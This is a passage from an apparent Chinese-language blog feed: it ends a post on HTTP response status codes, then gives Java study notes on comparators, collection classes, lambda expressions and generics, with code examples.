状态码描述</p><p>例子：HTTP/1.1 200 OK</p><p><strong>响应状态码详解：</strong></p><ul><li>1xx：服务器接受浏览器信息未完成，发送1xx状态码</li><li>2xx：成功，200</li><li>3xx：重定向，302，304（访问缓存）</li><li>4xx：客户端错误，404（没有找到对应资源），405（请求方法不被允许）</li><li>5xx：服务器错误，500（服务器内部出现异常）</li></ul><p><img src="https://image.icewindy.cn/202209060033315.png" alt="image-20220906003345245"></p></li><li><p><strong>响应头</strong></p></li><li><p><strong>响应空行</strong></p><p>即一个空行</p></li><li><p><strong>响应体</strong></p><p>即网页的内容</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记（11）：比较器、集合、Lambda表达式</title>
      <link href="/2022/06/07/Java%E7%AC%94%E8%AE%B0%EF%BC%8811%EF%BC%89%EF%BC%9A%E6%AF%94%E8%BE%83%E5%99%A8%E3%80%81%E9%9B%86%E5%90%88%E3%80%81Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2022/06/07/Java%E7%AC%94%E8%AE%B0%EF%BC%8811%EF%BC%89%EF%BC%9A%E6%AF%94%E8%BE%83%E5%99%A8%E3%80%81%E9%9B%86%E5%90%88%E3%80%81Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="比较器">比较器</h2><p>当我们需要实现对象的排序问题的时候，就要使用到Java的比较器。</p><p>Java实现对象排序的接口有两个：</p><ul><li>自然排序：java.lang.Comparable</li><li>定制排序：java.util.Comparator</li></ul><h3 id="自然排序">自然排序</h3><p>String、包装类等都默认实现了Comparable接口，重写了comparaTo(obj)方法，因此都可以直接使用自然排序。</p><p>自定义类若想实现自然排序，我们需要去实现Comparable接口，然后重写comparaTo(obj)方法方法，重写comparaTo(obj)方法具有一定的规则：</p><p>如果当前对象this大于形参对象obj，则返回正整数；如果当前对象this小于形参对象obj，则返回负整数；如果相等，则返回0。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span>(o <span class="keyword">instanceof</span> Goods)&#123;<span class="comment">//判断是否为Goods类型</span></span><br><span class="line">      <span class="type">Goods</span> <span class="variable">goods</span> <span class="operator">=</span> (Goods) o;<span class="comment">//将Object类型转换为Goods类型</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">this</span>.price &gt; goods.price)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">this</span>.price &lt; goods.price)&#123;</span><br><span class="line">         <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">return</span> -<span class="built_in">this</span>.name.compareTo(goods.name);<span class="comment">//若全部相等，则按照name进行比较</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;传入数据有误&quot;</span>);<span class="comment">//不是Goods类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="定制排序">定制排序</h3><p>当元素的类没有实现Comparable接口而又不便修改代码，或是实现了Comparable接口的排序不适合当前操作，则我们可以使用Comparator的对象进行排序。</p><p>由于Comparator也是一个接口，同样需要重写方法，我们需要重写compare(Object o1, Object o2)方法，重写规则与自然排序相类似：</p><p>如果返回正整数，则代表o1大于o2；如果返回负整数，则代表o1小于o2；如果返回0，则表示o1与o2相等。</p><p>使用的方式是在调用sort()等排序方法的时候，在参数列表添加Comparator的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Arrays.sort(goods, <span class="keyword">new</span> <span class="title class_">Comparator</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(o1 <span class="keyword">instanceof</span> Goods &amp;&amp; o2 <span class="keyword">instanceof</span> Goods)&#123;</span><br><span class="line"><span class="type">Goods</span> <span class="variable">goods1</span> <span class="operator">=</span> (Goods) o1;</span><br><span class="line"><span class="type">Goods</span> <span class="variable">goods2</span> <span class="operator">=</span> (Goods) o2;</span><br><span class="line"><span class="keyword">if</span>(goods1.getName().equals(goods2.getName()))&#123;</span><br><span class="line"><span class="keyword">return</span> Double.compare(goods1.getPrice(), goods2.getPrice());</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> goods1.getName().compareTo(goods2.getName());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;传入数据有误&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="集合">集合</h2><p>Java集合是Java的一种容器，可以动态的把多个对象的引用放入容器中。集合与数组类似，都是Java容器，但是数组作为存储对象的容器方面具有一些弊端。</p><p><strong>数组在内存存储方式的特点：</strong></p><ol><li>数组初始化以后，长度是确定的</li><li>数组声明的类型，决定了元素初始化的类型</li></ol><p><strong>数组在存储数据方面的弊端：</strong></p><ol><li>数组初始化以后，长度不可改变，不可拓展</li><li>数组提供的属性和方法太少，不便于增删改操作，且往往效率低，而且无法直接获取存储元素的个数（只能通过遍历等方法）</li><li>数组存储的数据是有序的，可以重复的，导致存储数组的特点单一</li></ol><p>Java集合可以分为两种体系：</p><ul><li><p>Collection接口：单列数组，定义了一组对象的方法的集合</p><ul><li>List接口：元素有序、可重复的集合</li><li>Set接口：元素无序、不可重复的集合</li><li>…</li></ul><p><img src="https://image.icewindy.cn/202206161133427.png" alt="image-20220616113327310"></p></li><li><p>Map接口：双列数据，保存具有映射关系“Key-value对”的集合，类似于“函数”，一个key只能对应一个value，一个value可以有多个key</p><p><img src="https://image.icewindy.cn/202206161133743.png" alt="image-20220616113350677"></p></li></ul><h3 id="collection接口">Collection接口</h3><h4 id="collection接口常用的方法">Collection接口常用的方法</h4><p><img src="https://image.icewindy.cn/202206211704116.png" alt="Collection常用方法"></p><h4 id="list接口：有序-可重复">List接口：有序、可重复</h4><p>迭代方式：fori配合size() 与 for-each</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//size()方法用于计算List的大小</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++)&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> (Object i : list)&#123;&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>LinkedList</strong>：链表，查询慢、增删快，无同步，线程不安全</li><li><strong>ArrayList</strong>：动态数组，查询快、删减慢，无同步，线程不安全</li><li><strong>Vector</strong>：动态数组，查询快、删减慢，同步，线程安全，但效率相较低</li></ul><p><img src="https://image.icewindy.cn/202206221706801.png" alt="这里写图片描述"></p><h4 id="set接口：无序-不可重复">Set接口：无序、不可重复</h4><p>无序性不等于随机性，无序性指的是存放的元素不是按照索引的顺序添加的，而是根据元素的哈希值决定的。</p><p>迭代方式：for-each，不可以用fori迭代。</p><ul><li><p><strong>HashSet</strong>：基于HashMap实现，Set接口的主要实现类，它不会记录插入的顺序。HashSet不是线程安全的。</p><p>添加元素的过程：</p><ol><li><p>对添加的元素计算哈希值。当添加元素为对象时，一般而言，我们都会在对象的类中重写hashCode()方法，若不重写，则Object继承下来的hashCode()的作用仅为生成一个随机数</p><p><img src="https://image.icewindy.cn/202206222159350.png" alt="image-20220622215950302"></p></li><li><p>取16（定义的底层数组的默认容量）的模，放入对应的位置</p></li><li><p>若遇到取模相同的，哈希值不同时，则会使用链表的方式存储，jdk7时，会使新元素替代原元素，并指向原元素，jdk8则会让原元素指向新元素</p></li><li><p>若遇到哈希值相同时，则需要equals()比较，若equals()相同则不填入，若equals()不相同，则会使用链表</p></li></ol></li><li><p><strong>LinkedHashSet</strong>：是HashSet的子类，使用链表使得迭代结果是添加顺序的。</p></li><li><p><strong>TreeSet</strong>：底层为红黑树结构存储，可以实现排序的实现类，要求放入的元素为<strong>相同类的对象</strong>。向TreeSet中添加元素，在遍历时默认会以自然排序的顺序遍历。</p><p>若我们添加的元素是对象之类的，由于没有比较的方式，则会报错，我们需要重写对象的类的compareTo()方法。自然排序实际上是实现了Comparable接口。在自然排序中，判断对象是否相等的标准为compareTo()返回是否为0，不再是equals。</p><p>而定制排序则是实现了Comparator接口，我们要使用定制排序，则需要在new TreeSet的时候，使用他的有参构造器，在参数内填入Comparator接口实现类的对象。在定制排序中，判断对象是否相等的标准为compare()返回是否为0，不再是equals。</p></li></ul><p>Set接口里没有定义新的方法。</p><p><strong>向Set接口的实现类添加的元素，一定需要重写hashCode()和equals()方法。且两个方法一定要保持规则的一致性，保证具有相等的散列码。</strong></p><h4 id="使用iterator接口遍历">使用Iterator接口遍历</h4><p>Iterator对象成为迭代器（设计模式的一种），主要用于遍历Collection集合中的元素。</p><p>迭代器定义：提供一种方法访问一个容器对象中各个元素，而不需要暴露该对象的内部细节。</p><p>Collection接口继承了java.lang.Iterable接口，因此它的实现类都提供了一个iterator()方法，它可以返回一个Iterable接口的对象，集合对象每次调用iterator()都会得到一个全新的迭代器对象，<strong>默认游标为第一个元素之前</strong>。</p><p>得到一个Iterable接口对象后，我们可以用Iterable的方法来获取集合内的元素：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (iterator.hasNext())&#123;<span class="comment">//hasNext()判断有无下一个元素</span></span><br><span class="line">   System.out.println(iterator.next());<span class="comment">//next()获取下一个元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Iterable有一个方法remove()，可以移除集合中的当前元素。</p><p>我们也可以使用for-each循环遍历集合，这样可以不使用Iterable接口。</p><h3 id="map接口">Map接口</h3><h4 id="map接口的常用方法">Map接口的常用方法</h4><p><img src="https://image.icewindy.cn/202206261006879.png" alt="这里写图片描述"></p><h4 id="map接口的实现类">Map接口的实现类</h4><ul><li><p><strong>HashMap</strong>：作为Map的主要实现类。线程不安全，效率高。可以存储null的key和value。</p></li><li><p><strong>LinkedHashMap</strong>：HashMap的子类。添加了一个链表的机构，可以使得在遍历时，按照添加顺序遍历。对于频繁的遍历操作，可以使用这个实现类。</p></li><li><p><strong>TreeMap</strong>：可以按照添加的Key进行排序，按照自然排序或定制排序遍历，类似于TreeSet，底层实现为红黑树。</p><p>Map的特殊方法：</p><p><img src="https://image.icewindy.cn/202206261211501.png" alt="这里写图片描述"></p></li><li><p><strong>Hashtable</strong>：最早的实现类，在Map出现之前就有。线程安全，效率低。不可以存储null的key和value。</p></li><li><p><strong>Properties</strong>：Hashtable的子类。常用于处理配置文件，key和value都是String类型。</p></li></ul><h3 id="总结">总结</h3><ul><li>ArrayXxx:底层数据结构是数组，查询快，增删慢</li><li>LinkedXxx:底层数据结构是链表，查询慢，增删快</li><li>HashXxx:底层数据结构是哈希表。依赖两个方法：hashCode()和equals()</li><li>TreeXxx:底层数据结构是二叉树。两种方式排序：自然排序和比较器排序</li></ul><h2 id="lambda表达式">Lambda表达式</h2><p>Lambda是一个匿名函数，可以理解为一段可以传递的代码。使用Lambda表达式可以使得我们的代码更加简洁。</p><p>Java的Lambda表达式本质是作为接口的实例。</p><p>使用举例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//未使用Lambda表达式</span></span><br><span class="line">Comparator&lt;Integer&gt; com1 = <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;Integer&gt;() &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Integer o1, Integer o2)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> Integer.compare(o1, o2);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">compare1</span> <span class="operator">=</span> com1.compare(<span class="number">32</span>, <span class="number">31</span>);</span><br><span class="line">System.out.println(compare1);</span><br><span class="line"><span class="comment">//使用Lambda表达式</span></span><br><span class="line">Comparator&lt;Integer&gt; com2 = (o1, o2) -&gt; Integer.compare(o1, o2);</span><br><span class="line"><span class="type">int</span> <span class="variable">compare2</span> <span class="operator">=</span> com2.compare(<span class="number">32</span>, <span class="number">31</span>);</span><br><span class="line">System.out.println(compare2);</span><br><span class="line"><span class="comment">//使用方法引用</span></span><br><span class="line">Comparator&lt;Integer&gt; com3 = Integer::compare;</span><br><span class="line"><span class="type">int</span> <span class="variable">compare3</span> <span class="operator">=</span> com3.compare(<span class="number">32</span>, <span class="number">31</span>);</span><br><span class="line">System.out.println(compare3);</span><br></pre></td></tr></table></figure><h3 id="使用方法">使用方法</h3><p>首先我们看到举例代码内的主要部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(o1, o2) -&gt; Integer.compare(o1, o2)</span><br></pre></td></tr></table></figure><p><strong>格式：</strong><br>-&gt;    ：Lambda操作符 / 箭头操作符<br>左侧：Lambda形参列表 实际上即为接口中抽象方法的形参<br>右侧：Lambda体 实际上即为实现的抽象方法的方法体</p><p>具体格式大致可分为六种情况：</p><ol><li><p><strong>无参无返回值</strong></p><p>不使用Lambda表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runnable</span> <span class="variable">runnable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runnable</span>()&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line">runnable.run();</span><br></pre></td></tr></table></figure><p>使用Lambda表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runnable</span> <span class="variable">runnable2</span> <span class="operator">=</span> () -&gt; System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">runnable2.run();</span><br></pre></td></tr></table></figure></li><li><p><strong>有参无返回值</strong></p><p>不使用Lambda表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Consumer&lt;String&gt; con1 = <span class="keyword">new</span> <span class="title class_">Consumer</span>&lt;&gt;()&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">(String s)</span> &#123;</span><br><span class="line">      System.out.println(s);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line">con1.accept(<span class="string">&quot;114514&quot;</span>);</span><br></pre></td></tr></table></figure><p>使用Lambda表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Consumer&lt;String&gt; con2 = (String s) -&gt; &#123;</span><br><span class="line">    System.out.println(s)</span><br><span class="line">&#125;;</span><br><span class="line">con2.accept(<span class="string">&quot;1919&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>数据类型省略 &quot;类型推断&quot;</strong></p><p>上面一种情况，编译器可以判断出数据类型，因此我们可以省略数据类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Consumer&lt;String&gt; con3 = (s) -&gt; &#123;</span><br><span class="line">    System.out.println(s)</span><br><span class="line">&#125;;</span><br><span class="line">con3.accept(<span class="string">&quot;810&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>只需要一个参数时，可省略参数小括号</strong></p><p>上面的情况，因为只有一个参数，因此我们可以省略参数的小括号：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Consumer&lt;String&gt; con2 = s -&gt; &#123;</span><br><span class="line">    System.out.println(s)</span><br><span class="line">&#125;;</span><br><span class="line">con2.accept(<span class="string">&quot;没活了&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>多参数且多条执行语句，且拥有返回值</strong></p><p>不使用Lambda表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Comparator&lt;Integer&gt; com1 = <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;&gt;()&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Integer o1, Integer o2)</span> &#123;</span><br><span class="line">      System.out.println(o1);</span><br><span class="line">      System.out.println(o2);</span><br><span class="line">      <span class="keyword">return</span> o1.compareTo(o2);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用Lambda表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Comparator&lt;Integer&gt; com2 = (o1, o2) -&gt; &#123;</span><br><span class="line">   System.out.println(o1);</span><br><span class="line">   System.out.println(o2);</span><br><span class="line">   <span class="keyword">return</span> o1.compareTo(o2);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>当Lambda体只有一条语句时，return与大括号可以省略</strong></p><p>不使用Lambda表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Comparator&lt;Integer&gt; com1 = <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;&gt;()&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Integer o1, Integer o2)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> o1.compareTo(o2);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用Lambda表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Comparator&lt;Integer&gt; com2 = (o1, o2) -&gt; o1.compareTo(o2);</span><br></pre></td></tr></table></figure></li></ol><h2 id="泛型">泛型</h2><p>泛型是 JDK 5 中引入的一个新特性，泛型提供了编译时类型安全检测机制，该机制允许程序员在编译时检测到非法的类型。</p><p>注：例子来源 <a href="https://pdai.tech/md/java/basic/java-basic-x-generic.html#%E6%B3%9B%E5%9E%8B%E7%B1%BB">Java 基础 - 泛型机制详解 | Java 全栈知识体系 (pdai.tech)</a></p><h3 id="泛型的作用">泛型的作用</h3><ul><li><p>代码复用</p><p>在没有泛型的情况下，如果我们想实现不同类型的加法，我们需要每种类型都重载一个add方法（如下）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    System.out.println(a + <span class="string">&quot;+&quot;</span> + b + <span class="string">&quot;=&quot;</span> + (a + b));</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">float</span> <span class="title function_">add</span><span class="params">(<span class="type">float</span> a, <span class="type">float</span> b)</span> &#123;</span><br><span class="line">    System.out.println(a + <span class="string">&quot;+&quot;</span> + b + <span class="string">&quot;=&quot;</span> + (a + b));</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">add</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span> &#123;</span><br><span class="line">    System.out.println(a + <span class="string">&quot;+&quot;</span> + b + <span class="string">&quot;=&quot;</span> + (a + b));</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过泛型，我们可以复用为一个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Number</span>&gt; <span class="type">double</span> <span class="title function_">add</span><span class="params">(T a, T b)</span> &#123;</span><br><span class="line">    System.out.println(a + <span class="string">&quot;+&quot;</span> + b + <span class="string">&quot;=&quot;</span> + (a.doubleValue() + b.doubleValue()));</span><br><span class="line">    <span class="keyword">return</span> a.doubleValue() + b.doubleValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上这就是一种模板开发的方式，在实例化前不指定T的类型，在实例化时再去指定，可以达到代码复用的作用。</p></li><li><p>类型安全</p><p>泛型中的类型在使用时指定，不需要强制类型转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">list.add(<span class="string">&quot;String&quot;</span>);</span><br><span class="line">list.add(<span class="number">100d</span>);</span><br><span class="line">list.add(<span class="keyword">new</span> <span class="title class_">Person</span>());</span><br></pre></td></tr></table></figure><p>在使用list时，list里的元素是Object类型的，我们无法约束其中的类型，所以当我们取出元素的时候，很容易会出现类型转换错误的问题。</p><p>使用泛型可以达到类型约束的效果，提供了一个编译前的检查：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br></pre></td></tr></table></figure></li></ul><h3 id="泛型的使用">泛型的使用</h3><p>泛型的使用大概分为三种类型：泛型类、泛型接口、泛型方法</p><h4 id="泛型类-泛型接口">泛型类、泛型接口</h4><p>泛型类和泛型接口是一种模板化开发的思想，也就是我们提及的第一个作用。</p><p>如果定义了泛型类，在实例化时没有指定类的泛型，则认为此泛型为Object，不建议这样使用。</p><p>一个简单的泛型类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span>&lt;T&gt;&#123;         <span class="comment">// 此处可以随便写标识符号，T是type的简称  </span></span><br><span class="line">    <span class="keyword">private</span> T <span class="keyword">var</span> ;     <span class="comment">// var的类型由T指定，即：由外部指定  </span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getVar</span><span class="params">()</span>&#123;  <span class="comment">// 返回值的类型由外部决定  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">var</span> ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVar</span><span class="params">(T <span class="keyword">var</span>)</span>&#123;  <span class="comment">// 设置的类型也由外部决定  </span></span><br><span class="line">        <span class="built_in">this</span>.<span class="keyword">var</span> = <span class="keyword">var</span> ;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenericsDemo06</span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;  </span><br><span class="line">        Point&lt;String&gt; p = <span class="keyword">new</span> <span class="title class_">Point</span>&lt;String&gt;() ;     <span class="comment">// 里面的var类型为String类型  </span></span><br><span class="line">        p.setVar(<span class="string">&quot;it&quot;</span>) ;                            <span class="comment">// 设置字符串  </span></span><br><span class="line">        System.out.println(p.getVar().length()) ;   <span class="comment">// 取得字符串的长度  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多元泛型:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Notepad</span>&lt;K,V&gt;&#123;       <span class="comment">// 此处指定了两个泛型类型  </span></span><br><span class="line">    <span class="keyword">private</span> K key ;     <span class="comment">// 此变量的类型由外部决定  </span></span><br><span class="line">    <span class="keyword">private</span> V value ;   <span class="comment">// 此变量的类型由外部决定  </span></span><br><span class="line">    <span class="keyword">public</span> K <span class="title function_">getKey</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.key ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> V <span class="title function_">getValue</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.value ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setKey</span><span class="params">(K key)</span>&#123;  </span><br><span class="line">        <span class="built_in">this</span>.key = key ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(V value)</span>&#123;  </span><br><span class="line">        <span class="built_in">this</span>.value = value ;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenericsDemo09</span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;  